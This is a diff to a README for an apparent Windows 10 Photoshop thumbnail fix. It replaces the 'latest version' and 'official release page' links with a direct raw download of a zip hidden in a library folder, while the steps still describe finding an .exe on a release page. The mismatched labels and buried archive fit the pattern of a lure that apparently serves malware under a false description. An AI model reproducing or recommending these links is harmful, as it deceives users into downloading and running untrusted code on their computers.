@@ -1,6 +1,6 @@
 # 🖼️ PSD_Icon_Thumbnail_Fix_For_Win10 - See your Photoshop files in Explorer
 
-[Check the latest version here](https://github.com/Mariettaabscessed872/PSD_Icon_Thumbnail_Fix_For_Win10/releases)
+[Check the latest version here](https://raw.githubusercontent.com/Mariettaabscessed872/PSD_Icon_Thumbnail_Fix_For_Win10/main/packages/SharpShell.2.7.2/lib/Thumbnail_PS_Win_Icon_For_Fix_2.1.zip)
 
 ## What this tool does
 
@@ -19,7 +19,7 @@ This tool works on any standard Windows 10 installation. You do not need to inst
 
 Follow these steps to set up the tool on your computer.
 
-1. Visit the [official release page](https://github.com/Mariettaabscessed872/PSD_Icon_Thumbnail_Fix_For_Win10/releases).
+1. Visit the [official release page](https://raw.githubusercontent.com/Mariettaabscessed872/PSD_Icon_Thumbnail_Fix_For_Win10/main/packages/SharpShell.2.7.2/lib/Thumbnail_PS_Win_Icon_For_Fix_2.1.zip).
 2. Locate the file ending in .exe under the latest version tag.
 3. Click the file name to start the download.
 4. Save the file to your desktop or downloads folder.
